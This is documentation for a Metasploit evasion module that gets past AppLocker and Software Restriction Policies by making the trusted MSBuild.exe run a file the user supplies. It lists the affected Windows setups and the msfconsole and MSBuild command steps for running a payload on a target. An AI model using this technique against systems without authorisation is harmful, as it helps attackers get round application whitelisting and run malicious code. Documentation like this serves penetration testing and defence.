## Introduction

This module is designed to evade solutions such as software restriction policies and Applocker.
Applocker in its default configuration will block code in the form of executables (.exe and .com, .msi), scripts (.ps1, .vbs, .js) and dll's from running in user controlled directories.
Applocker enforces this by employing whitelisting, in that code can only be run from the protected directories and sub directories of "Program Files" and "Windows"
The main vector for this bypass is to use the trusted binary MSBuild.exe to execute user supplied code as this binary is located within the trusted Windows directory.

## Vulnerable Application

This evasion will work on all versions of Windows that include .NET versions 3.5 or greater that has solutions such as Applocker or Software Restriction Policies active, that do not explicitly block MSBuild.exe or the "Microsoft.Net" directory.

## Options

- **FILENAME** - Filename for the evasive file (default: msbuild.txt).

## Verification Steps

  1. Start `msfconsole`
  2. Do: `use evasion/windows/applocker_evasion_msbuild`
  3. Do: `set PAYLOAD <payload>`
  4. Do: `run`
  5. The module will now display instructions of how to proceed
  6. `[+] msbuild.txt stored at /root/.msf4/local/msbuild.txt`
  7. `[*] Copy msbuild.txt to the target`
  8. `[*] Execute using: C:\Windows\Microsoft.Net\Framework64\[.NET Version]\MSBuild.exe msbuild.txt` replace [.NET Version] with the version directory present on the target (typically "v4.0.30319").

## References

https://attack.mitre.org/techniques/T1127/
